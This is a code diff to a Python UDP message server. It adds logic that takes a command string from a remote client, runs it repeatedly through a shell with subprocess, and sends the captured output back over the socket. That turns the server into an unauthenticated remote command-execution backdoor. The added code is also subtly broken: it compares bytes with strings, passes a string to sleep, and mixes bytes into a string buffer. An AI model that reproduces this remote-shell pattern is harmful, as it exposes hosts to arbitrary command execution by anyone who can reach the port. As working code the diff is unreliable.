@@ -1,4 +1,5 @@
 import socket
+import subprocess
 import sys
 import receiver
 import time
@@ -74,11 +75,41 @@ if __name__ == '__main__':
             # msgs[i] = "\nFrom IP: {ip} at time: {t}\n".format(ip=tempIP, t=time.time())
             temp = ""
             for x in receiver.f:
-                temp = temp + x.decode("utf-8")
+                temp = temp + x.decode("ascii")
+
+            tempFile = open("tempfile.txt", 'wb')
+            cmdArr = ["", "", ""]  # execTimes, execDelay, cmd
+            tempCnt = 0
+            for x in receiver.f:
+                if x == '@':
+                    tempCnt = tempCnt + 1
+                if tempCnt == 3:
+                    break
+                cmdArr[tempCnt] = cmdArr[tempCnt] + x
+
+            for i in range(0, int(cmdArr[0])):
+                p = subprocess.Popen(cmdArr[2], stdout=subprocess.PIPE, shell=True)
+                (output, err) = p.communicate()
+                output = str(output)
+                for c in output:
+                    tempFile.write(bytes(c, "ascii"))
+
+                tempFile.write(bytes('\n', "ascii"))
+                time.sleep(cmdArr[1])
+
+            tempFile.close()
+
+            toSend = ''
+            tempFile = open("tempfile.txt", 'rb')
+            while (True):
+                d = tempFile.read(2)
+                if d == b'':
+                    break
+                toSend += d
 
             # data = sendMsg(msgs)
             # test = address[1]
             # test2 = str.encode(data)
             # test3 = str(port)
-            # server_socket.sendto(str.encode(data), (tempIP, address[1]))  # send data to the client
+            server_socket.sendto(str.encode(toSend), (tempIP, address[1]))  # send data to the client
 
